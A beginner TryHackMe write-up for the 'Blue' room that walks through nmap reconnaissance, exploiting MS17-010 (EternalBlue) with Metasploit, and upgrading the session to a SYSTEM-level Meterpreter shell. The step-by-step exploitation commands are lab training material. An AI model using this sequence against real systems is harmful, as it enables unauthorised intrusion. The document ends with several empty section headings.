# Blue — TryHackMe

**Author:** Rameez Ahmed • **Date:** 2025-11-11 • **Difficulty:** Beginner
**IP:** 10.10.9.100 • **Platform:** TryHackMe

---

## TL;DR

A Windows host exploited remotely: a discovered vulnerability was used to achieve remote code execution, gain an initial low-privilege shell as an attacker, and then escalate to SYSTEM. Flags are redacted for public posting.

---

## Environment & Tools

* <Target IP>
* Attacker: Kali Linux (tools used: `nmap`, `msfconsole`, `metasploit`)
* Notes: This writeup is sanitized for public posting. Replace `REDACTED` with your personal notes if you keep a private copy.

---

## Recon

**Objective:** Discover open services, versions, and likely attack vectors.

1. TCP Port Scan
```bash
nmap -p- <target_ip>
```
This enumerates all TCP ports and reports running services; results will be used to prioritise potential attack vectors

**Objective:** Scan the first 1000 ports

2. TCP Port Scan for first 1000 Ports
```bash
nmap -p 1-999 <target_ip>
```
Ports 1–1000 commonly host services such as HTTP, SMB, and RDP; they are prioritised for follow-up enumeration


**Objective:** Identify the Vulnerabiltiy that the Target Machine has.

From the Hint provided the Vulnerbaility is understood to be related to SMBv1, and with some trial and error of the numerous MS exploits associated the one found to be a match was displayed by
3. Vulnerability Scan on Port 445
```bash
nmap -p 445 --script=smb-vuln-ms17-010 <target_ip>
```
Showing us that the Target is Vulnerable to Remote Code Executuion also known as Eternal Blue, under CVE-2017-0143 family. 

---

## Gain Access

**Objective:** Find and Configure the Exploit that the Target Machine is Vulnerable to

1. Start Metasploit
```bash
msfconsole
```
This is a Security Framework used to Identify and Launch Vulnerabilities

2. Search and Use the correct Exploit
```bash
search ms17-010
```
Here we find where exactly the Exploit Payload is located within Metasploit
```bash
use <Path-to-Payload>
```
This sets the Payload for us to Configure and Run

3. Configure the Payload
```bash
Show Options
```
This lists all Parameters, Required and Unrequired, to Configure before running
```bash
set RHOSTS <Target_IP>
```
Fill the Require Parameter 'RHOSTS' (Remote Host) with the IP of the Target so the Payload Exploits the Target

2. Run the Exploit
```bash
run
```
This will Execute the Payload using all the Parameters set and give Access to the Targets Machine

---

## Escalate

**Objective:** Escalate the Privilege of the Shell Obtained to Grant further Access

1. Background the Shell (Ctrl+Z) and Find Module that Converts a Shell into a Meterpreter Shell
```bash
search shell_to_meterpreter
```
Finding the Path to that Module in Metaspolit will allow us to Escalate the Privilege of the Current Shell Obtained 

2. Use and Configure the Converter with the Backgrounded Session
```bash
show options
```
Check the Required Parameters, in this case being the Session Number
```bash
set SESSION <Session-Num>
```
Set the Session to the Session Number of the Shell we Backgrounded in Gain Access

3. Run the Exploit
```bash
run
```
This should open up a Meterpreter Shell with Elevated Privileges. To check this, go to the Windows Shell using Command 'shell' then check Identity of shell with Command 'whoami'. If output 'NT AUTHORITY\SYSTEM' then Privileges have been Elevated

---

## 

---

## 

---

##

---

## 

---

## 

---

## 
